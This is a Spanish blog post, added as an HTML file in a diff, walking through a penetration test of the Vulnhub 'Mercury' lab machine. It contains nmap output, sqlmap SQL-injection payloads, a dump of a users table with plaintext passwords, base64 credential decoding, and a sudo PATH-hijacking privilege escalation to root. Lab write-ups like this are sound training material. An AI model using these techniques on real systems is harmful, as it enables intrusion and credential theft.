@@ -1,0 +1,109 @@
+<!doctype html><html lang=en><head><title>Vulnhub: Mercury &ndash; /dev/random</title><meta name=description content="Cultura hacker, software open source y arte hiperdigital"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=UTF-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://datadiego.github.io/blog-nekoweb/css/palettes/base16-dark.css><link rel=stylesheet href=https://datadiego.github.io/blog-nekoweb/css/risotto.css><link rel=stylesheet href=https://datadiego.github.io/blog-nekoweb/css/custom.css><link rel=stylesheet href=/blog-nekoweb/css/syntax.css><script src=/blog-nekoweb/js/copy-code.js defer></script><meta property="og:title" content="Vulnhub: Mercury &ndash; /dev/random"><meta property="og:url" content="https://datadiego.github.io/blog-nekoweb/posts/mercury/"><meta property="og:description" content="Pentesting a máquina Mercury en Vulnhub &ndash; "><meta property="og:locale" content="es-ES"><meta property="og:image" content></head><body><div class=page><header class=page__header><nav class="page__nav main-nav"><ul><li class=nomarker><h1 class=page__logo><a href=https://datadiego.github.io/blog-nekoweb/ class=page__logo-inner>/dev/random</a></h1></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/blog-nekoweb/posts/ title>Posts</a></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/blog-nekoweb/about/ title>About</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>Vulnhub: Mercury</h1></header><div class=content__body><p>Puedes descargar la maquina vulnerable desde <a href=https://www.vulnhub.com/entry/the-planets-mercury,544/>vulnhub</a></p><h2 id=datos>Datos</h2><p>IP Atacante: 192.168.0.25
+IP Victima: 192.168.0.31</p><h2 id=recon>Recon</h2><h3 id=nmap>Nmap</h3><pre tabindex=0><code>datadiego@~ nmap -Pn 192.168.0.31
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:50 CET
+Nmap scan report for 192.168.0.31
+Host is up (0.0013s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+</code></pre><h2 id=web>Web</h2><p>En la maquina hay un servidor http, en el index solo hay un mensaje en plano:</p><pre tabindex=0><code>Hello. This site is currently in development please check back later.
+</code></pre><p>Existe un robots.txt:</p><pre tabindex=0><code>User-agent: * 
+Disallow: /
+</code></pre><p>Si intentamos entrar a cualquier otra pagina que no existe:</p><pre tabindex=0><code>
+Page not found (404)
+Request Method: 	GET
+Request URL: 	http://192.168.0.31:8080/hello
+
+Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:
+
+    [name=&#39;index&#39;]
+    robots.txt [name=&#39;robots&#39;]
+    mercuryfacts/
+
+The current path, hello, didn&#39;t match any of these.
+
+You&#39;re seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
+</code></pre><p>Ahora sabemos que el servidor es un django, y que existe un endpoint <code>mercuryfacts</code>.</p><p>Cuando accedemos a /mercuryfacts encontramos otros dos endpoints:</p><ul><li>/mercuryfacts/todo</li><li>/mercuryfacts/:number</li></ul><p>En la lista de /todo:</p><pre tabindex=0><code> Still todo:
+
+    Add CSS.
+    Implement authentication (using users table)
+    Use models in django instead of direct mysql call
+    All the other stuff, so much!!!
+</code></pre><p>Lanzamos sqlmap:</p><pre tabindex=0><code>sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --dbs --batch
+</code></pre><p>Encuentra lo siguiente:</p><pre tabindex=0><code>sqlmap identified the following injection point(s) with a total of 1876 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: error-based
+    Title: MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: http://192.168.0.31:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x7170706b71,(SELECT (ELT(7619=7619,1))),0x7170707a71),7619)
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace
+    Payload: http://192.168.0.31:8080/mercuryfacts/(CASE WHEN (5772=5772) THEN SLEEP(5) ELSE 5772 END)
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 1 column
+    Payload: http://192.168.0.31:8080/mercuryfacts/-9431 UNION ALL SELECT CONCAT(0x7170706b71,0x746152665350437975484f575550785542644a64465743704a555253535467456c67735377476378,0x7170707a71)#
+---
+[05:11:02] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.6
+[05:11:02] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] mercury
+
+[05:11:02] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/192.168.0.31&#39;
+
+[*] ending @ 05:11:02 /2025-02-11/
+</code></pre><p>Sacamos datos de las tablas con:</p><pre tabindex=0><code>sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --current-db -D mercury --batch --dump-all
+</code></pre><p>Encontramos lo siguiente:</p><pre tabindex=0><code>[05:50:50] [INFO] fetching entries for table &#39;users&#39; in database &#39;mercury&#39;
+Database: mercury
+Table: users
+[4 entries]
++----+-------------------------------+-----------+
+| id | password                      | username  |
++----+-------------------------------+-----------+
+| 1  | johnny1987                    | john      |
+| 2  | lovemykids111                 | laura     |
+| 3  | lovemybeer111                 | sam       |
+| 4  | mercuryisthesizeof0.056Earths | webmaster |
++----+-------------------------------+-----------+
+</code></pre><p>Ningun usuario funciona en SSH excepto <code>webmaster</code></p><p>Encontramos la user_flag.txt:</p><pre tabindex=0><code>user_flag_8339915c9a454657bd60ee58776f4ccd
+</code></pre><p>En <code>/etc/passwd</code> encontramos otro usuario:
+linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash</p><p>Encontramos el hash de ambos:</p><pre tabindex=0><code>webmaster@mercury:~$ cat mercury_proj/notes.txt 
+Project accounts (both restricted):
+webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
+</code></pre><p>Descodificamos la contraseña:</p><pre tabindex=0><code>webmaster@mercury:~/mercury_proj/mercury_proj$ echo &#34;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&#34; | base64 -d
+mercurymeandiameteris4880km
+</code></pre><p>Entramos por SSH o mediante <code>su linuxmaster</code> y comprobamos permisos con sudo -l:</p><pre tabindex=0><code>linuxmaster@mercury:~$ sudo -l
+[sudo] password for linuxmaster: 
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+</code></pre><p>Comprobamos el archivo:</p><pre tabindex=0><code>linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
+#!/bin/bash
+tail -n 10 /var/log/syslog
+</code></pre><p>El comando se esta ejecutando directamente, sin especificar la ruta absoluta, por lo que es vulnerable a <code>path hijacking</code>.</p><p>Podemos hacer lo siguiente:</p><pre tabindex=0><code>linuxmaster@mercury:~$ mkdir /tmp/malito
+</code></pre><p>Dentro del directorio, creamos un <code>.sh</code> que ejecute una shell con nano:</p><pre tabindex=0><code>#!/bin/bash
+/bin/bash
+</code></pre><p>Damos permisos con <code>chmod +x /tmp/malito/tail</code>.
+Exportamos la variable con <code>export PATH=/tmp/malito:$PATH</code>
+Ejecutamos el script utilizando la variable de entorno con <code>sudo --preserve-env=PATH /usr/bin/check_syslog.sh</code></p><p>Obtenemos acceso a root!</p><pre tabindex=0><code>linuxmaster@mercury:~$ cd /tmp/malito/
+linuxmaster@mercury:/tmp/malito$ ls
+linuxmaster@mercury:/tmp/malito$ nano tail
+linuxmaster@mercury:/tmp/malito$ ls
+tail
+linuxmaster@mercury:/tmp/malito$ chmod +x /tmp/malito/tail 
+linuxmaster@mercury:/tmp/malito$ export PATH=/tmp/malito:$PATH
+linuxmaster@mercury:/tmp/malito$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
+[sudo] password for linuxmaster: 
+root@mercury:/tmp/malito# whoami
+root
+root@mercury:/tmp/malito# 
+</code></pre></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><div class=aside__about><span class=about__logo role=img>✨</span>&nbsp;<h1 class=about__title>/dev/random</h1><p class=about__description>Cultura hacker, software open source y arte hiperdigital</p></div><ul class=aside__social-links><li><a href=https://github.com/datadiego rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=juandiegomariscal@gmail.com rel=me aria-label=Email title=Email><i class="fa-solid fa-envelope" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>Pentesting a máquina Mercury en Vulnhub</p><p>By datadiego,
+2025-07-15</p></div></section><footer class=page__footer><p><br><span class=active>$ echo $LANG<br><b></b></span><br></p><br><br><p class=copyright>© datadiego</p><script src=https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js></script><script>mermaid.initialize({startOnLoad:!0,theme:"dark"})</script></footer></div></body></html>
